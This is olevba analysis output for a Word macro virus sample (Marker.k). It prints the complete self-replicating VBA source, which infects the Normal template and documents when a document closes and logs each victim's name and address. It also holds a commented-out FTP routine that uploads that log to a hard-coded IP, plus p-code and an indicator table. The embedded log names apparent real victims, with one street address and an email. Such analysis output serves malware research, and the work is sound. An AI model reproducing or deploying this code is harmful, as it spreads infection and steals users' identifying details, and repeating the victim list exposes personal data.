olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


' Switch the VirusProtection OFF
' Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
'    For i = 1 To 4
'      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
'    Next i
'    LogFile = "C:\hsf" & LogFile & ".sys"
    
'    Open LogFile For Output As #1
'    Print #1, LogData
'    Close #1
    
'    Open "c:\netldx.vxd" For Output As #1
'    Print #1, "o 209.201.88.110"
'    Print #1, "user anonymous"
'    Print #1, "pass itsme@"
'    Print #1, "cd incoming"
'    Print #1, "ascii"
'    Print #1, "put " & LogFile
'    Print #1, "quit"
'    Close #1
    
'    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
'    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 02:47:55 PM - Friday, 22 Jan 1999
' Michael L. Pusey
'



' 08:24:22 AM - Sunday, 24 Jan 1999
' Andrea F. Walker
'



' 08:21:33 PM - Sunday, 24 Jan 1999
' Brian Turner
'



' 01:46:46 PM - Tuesday, 26 Jan 1999
' Brad Englert
' Andersen Consulting LLP
' 701 Brazos, Suite 1000
' Austin, TX  78701



' 05:32:45 PM - Tuesday, 26 Jan 1999
' Marcia Lemmons
'



' 10:42:32  - Wednesday, 3 Feb 1999
' Lisa Ann La Plant
'



' 01:37:32  - Thursday, 4 Feb 1999
' Harvard Publication Relations
'



' 02:04:29 PM - Monday, 15 Feb 1999
' annie
'



' 10:19:22  - Montag, 22 Feb 1999
' karin schmid
'



' 08:34:26  - Montag, 1 Mrz 1999
' margit
'



' 10:38:06  - mandag, 8 mar 1999
' Birthe Christensen
'



' 08:07:08  - tirsdag, 9 mar 1999
' Danisco A/S
'



' 08:27:18  - mandag, 15 mar 1999
' DD-S, JRH
'



' 09:43:22  - fredag, 19 mar 1999
' Birthe Christensen
'



' 01:38:29  - tirsdag, 23 mar 1999
' Susanne L. Sørensen
' SFSLS@DANISCO.COM



' 02:08:34  - tirsdag, 6 apr 1999
' Fddd2
'



' 01:07:09  - fredag, 9 apr 1999
' Fddd2
'



' 01:49:27 PM - Tuesday, 13 Apr 1999
' Avert
'



' 12:20:48  - âòîðíèê, 4 ìàé 1999
' Mike Pavluschick
'



' 03:06:13 PM - Tuesday, 27 Feb 2001
' Tester
'



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 11905 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' Line #4:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #5:
' Line #6:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #7:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #8:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #9:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #10:
' Line #11:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #13:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #14:
' Line #15:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #16:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #17:
' Line #18:
' Line #19:
' 	QuoteRem 0x0000 0x001F " Switch the VirusProtection OFF"
' Line #20:
' 	QuoteRem 0x0000 0x0020 " Options.VirusProtection = False"
' Line #21:
' Line #22:
' Line #23:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #24:
' Line #25:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #27:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #28:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #32:
' Line #33:
' 	QuoteRem 0x0000 0x0012 "    For i = 1 To 4"
' Line #34:
' 	QuoteRem 0x0000 0x0036 "      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)"
' Line #35:
' 	QuoteRem 0x0000 0x000A "    Next i"
' Line #36:
' 	QuoteRem 0x0000 0x0029 "    LogFile = "C:\hsf" & LogFile & ".sys""
' Line #37:
' Line #38:
' 	QuoteRem 0x0000 0x0021 "    Open LogFile For Output As #1"
' Line #39:
' 	QuoteRem 0x0000 0x0015 "    Print #1, LogData"
' Line #40:
' 	QuoteRem 0x0000 0x000C "    Close #1"
' Line #41:
' Line #42:
' 	QuoteRem 0x0000 0x0029 "    Open "c:\netldx.vxd" For Output As #1"
' Line #43:
' 	QuoteRem 0x0000 0x0020 "    Print #1, "o 209.201.88.110""
' Line #44:
' 	QuoteRem 0x0000 0x001E "    Print #1, "user anonymous""
' Line #45:
' 	QuoteRem 0x0000 0x001B "    Print #1, "pass itsme@""
' Line #46:
' 	QuoteRem 0x0000 0x001B "    Print #1, "cd incoming""
' Line #47:
' 	QuoteRem 0x0000 0x0015 "    Print #1, "ascii""
' Line #48:
' 	QuoteRem 0x0000 0x001E "    Print #1, "put " & LogFile"
' Line #49:
' 	QuoteRem 0x0000 0x0014 "    Print #1, "quit""
' Line #50:
' 	QuoteRem 0x0000 0x000C "    Close #1"
' Line #51:
' Line #52:
' 	QuoteRem 0x0000 0x003E "    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide"
' Line #53:
' Line #54:
' 	QuoteRem 0x0000 0x0077 "    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True"
' Line #55:
' Line #56:
' 	EndIfBlock 
' Line #57:
' Line #58:
' Line #59:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #60:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #61:
' Line #62:
' Line #63:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #64:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #65:
' Line #66:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #67:
' Line #68:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #69:
' Line #70:
' Line #71:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #72:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #73:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #74:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #75:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	ElseBlock 
' Line #78:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #81:
' Line #82:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #83:
' Line #84:
' Line #85:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #86:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #87:
' Line #88:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #89:
' Line #90:
' 	EndIfBlock 
' Line #91:
' Line #92:
' Line #93:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #94:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #95:
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #97:
' Line #98:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #99:
' Line #100:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #101:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #102:
' Line #103:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #104:
' Line #105:
' 	EndIfBlock 
' Line #106:
' Line #107:
' Line #108:
' 	EndIfBlock 
' Line #109:
' Line #110:
' 	EndSub 
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #113:
' Line #114:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #115:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #116:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #117:
' 	QuoteRem 0x0000 0x0000 ""
' Line #118:
' Line #119:
' Line #120:
' Line #121:
' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
' Line #122:
' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
' Line #123:
' 	QuoteRem 0x0000 0x0000 ""
' Line #124:
' Line #125:
' Line #126:
' Line #127:
' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
' Line #128:
' 	QuoteRem 0x0000 0x0004 " UPS"
' Line #129:
' 	QuoteRem 0x0000 0x0000 ""
' Line #130:
' Line #131:
' Line #132:
' Line #133:
' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
' Line #134:
' 	QuoteRem 0x0000 0x0004 " WRO"
' Line #135:
' 	QuoteRem 0x0000 0x0000 ""
' Line #136:
' Line #137:
' Line #138:
' Line #139:
' 	QuoteRem 0x0000 0x0023 " 11:37:56 AM - Tuesday, 29 Dec 1998"
' Line #140:
' 	QuoteRem 0x0000 0x0009 " Dan Ross"
' Line #141:
' 	QuoteRem 0x0000 0x0000 ""
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' 	QuoteRem 0x0000 0x0022 " 09:50:06 AM - Monday, 11 Jan 1999"
' Line #146:
' 	QuoteRem 0x0000 0x000F " Karen M. Pinks"
' Line #147:
' 	QuoteRem 0x0000 0x0000 ""
' Line #148:
' Line #149:
' Line #150:
' Line #151:
' 	QuoteRem 0x0000 0x0024 " 04:41:03 PM - Thursday, 21 Jan 1999"
' Line #152:
' 	QuoteRem 0x0000 0x0013 " george w. connelly"
' Line #153:
' 	QuoteRem 0x0000 0x0000 ""
' Line #154:
' Line #155:
' Line #156:
' Line #157:
' 	QuoteRem 0x0000 0x0022 " 02:47:55 PM - Friday, 22 Jan 1999"
' Line #158:
' 	QuoteRem 0x0000 0x0011 " Michael L. Pusey"
' Line #159:
' 	QuoteRem 0x0000 0x0000 ""
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' 	QuoteRem 0x0000 0x0022 " 08:24:22 AM - Sunday, 24 Jan 1999"
' Line #164:
' 	QuoteRem 0x0000 0x0011 " Andrea F. Walker"
' Line #165:
' 	QuoteRem 0x0000 0x0000 ""
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' 	QuoteRem 0x0000 0x0022 " 08:21:33 PM - Sunday, 24 Jan 1999"
' Line #170:
' 	QuoteRem 0x0000 0x000D " Brian Turner"
' Line #171:
' 	QuoteRem 0x0000 0x0000 ""
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0023 " 01:46:46 PM - Tuesday, 26 Jan 1999"
' Line #176:
' 	QuoteRem 0x0000 0x000D " Brad Englert"
' Line #177:
' 	QuoteRem 0x0000 0x0018 " Andersen Consulting LLP"
' Line #178:
' 	QuoteRem 0x0000 0x0017 " 701 Brazos, Suite 1000"
' Line #179:
' 	QuoteRem 0x0000 0x0012 " Austin, TX  78701"
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' 	QuoteRem 0x0000 0x0023 " 05:32:45 PM - Tuesday, 26 Jan 1999"
' Line #184:
' 	QuoteRem 0x0000 0x000F " Marcia Lemmons"
' Line #185:
' 	QuoteRem 0x0000 0x0000 ""
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' 	QuoteRem 0x0000 0x0022 " 10:42:32  - Wednesday, 3 Feb 1999"
' Line #190:
' 	QuoteRem 0x0000 0x0012 " Lisa Ann La Plant"
' Line #191:
' 	QuoteRem 0x0000 0x0000 ""
' Line #192:
' Line #193:
' Line #194:
' Line #195:
' 	QuoteRem 0x0000 0x0021 " 01:37:32  - Thursday, 4 Feb 1999"
' Line #196:
' 	QuoteRem 0x0000 0x001E " Harvard Publication Relations"
' Line #197:
' 	QuoteRem 0x0000 0x0000 ""
' Line #198:
' Line #199:
' Line #200:
' Line #201:
' 	QuoteRem 0x0000 0x0022 " 02:04:29 PM - Monday, 15 Feb 1999"
' Line #202:
' 	QuoteRem 0x0000 0x0006 " annie"
' Line #203:
' 	QuoteRem 0x0000 0x0000 ""
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0020 " 10:19:22  - Montag, 22 Feb 1999"
' Line #208:
' 	QuoteRem 0x0000 0x000D " karin schmid"
' Line #209:
' 	QuoteRem 0x0000 0x0000 ""
' Line #210:
' Line #211:
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x001F " 08:34:26  - Montag, 1 Mrz 1999"
' Line #214:
' 	QuoteRem 0x0000 0x0007 " margit"
' Line #215:
' 	QuoteRem 0x0000 0x0000 ""
' Line #216:
' Line #217:
' Line #218:
' Line #219:
' 	QuoteRem 0x0000 0x001F " 10:38:06  - mandag, 8 mar 1999"
' Line #220:
' 	QuoteRem 0x0000 0x0013 " Birthe Christensen"
' Line #221:
' 	QuoteRem 0x0000 0x0000 ""
' Line #222:
' Line #223:
' Line #224:
' Line #225:
' 	QuoteRem 0x0000 0x0020 " 08:07:08  - tirsdag, 9 mar 1999"
' Line #226:
' 	QuoteRem 0x0000 0x000C " Danisco A/S"
' Line #227:
' 	QuoteRem 0x0000 0x0000 ""
' Line #228:
' Line #229:
' Line #230:
' Line #231:
' 	QuoteRem 0x0000 0x0020 " 08:27:18  - mandag, 15 mar 1999"
' Line #232:
' 	QuoteRem 0x0000 0x000A " DD-S, JRH"
' Line #233:
' 	QuoteRem 0x0000 0x0000 ""
' Line #234:
' Line #235:
' Line #236:
' Line #237:
' 	QuoteRem 0x0000 0x0020 " 09:43:22  - fredag, 19 mar 1999"
' Line #238:
' 	QuoteRem 0x0000 0x0013 " Birthe Christensen"
' Line #239:
' 	QuoteRem 0x0000 0x0000 ""
' Line #240:
' Line #241:
' Line #242:
' Line #243:
' 	QuoteRem 0x0000 0x0021 " 01:38:29  - tirsdag, 23 mar 1999"
' Line #244:
' 	QuoteRem 0x0000 0x0014 " Susanne L. Sørensen"
' Line #245:
' 	QuoteRem 0x0000 0x0012 " SFSLS@DANISCO.COM"
' Line #246:
' Line #247:
' Line #248:
' Line #249:
' 	QuoteRem 0x0000 0x0020 " 02:08:34  - tirsdag, 6 apr 1999"
' Line #250:
' 	QuoteRem 0x0000 0x0006 " Fddd2"
' Line #251:
' 	QuoteRem 0x0000 0x0000 ""
' Line #252:
' Line #253:
' Line #254:
' Line #255:
' 	QuoteRem 0x0000 0x001F " 01:07:09  - fredag, 9 apr 1999"
' Line #256:
' 	QuoteRem 0x0000 0x0006 " Fddd2"
' Line #257:
' 	QuoteRem 0x0000 0x0000 ""
' Line #258:
' Line #259:
' Line #260:
' Line #261:
' 	QuoteRem 0x0000 0x0023 " 01:49:27 PM - Tuesday, 13 Apr 1999"
' Line #262:
' 	QuoteRem 0x0000 0x0006 " Avert"
' Line #263:
' 	QuoteRem 0x0000 0x0000 ""
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' 	QuoteRem 0x0000 0x0020 " 12:20:48  - âòîðíèê, 4 ìàé 1999"
' Line #268:
' 	QuoteRem 0x0000 0x0011 " Mike Pavluschick"
' Line #269:
' 	QuoteRem 0x0000 0x0000 ""
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' 	QuoteRem 0x0000 0x0023 " 03:06:13 PM - Tuesday, 27 Feb 2001"
' Line #274:
' 	QuoteRem 0x0000 0x0007 " Tester"
' Line #275:
' 	QuoteRem 0x0000 0x0000 ""
' Line #276:
' Line #277:
' Line #278:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

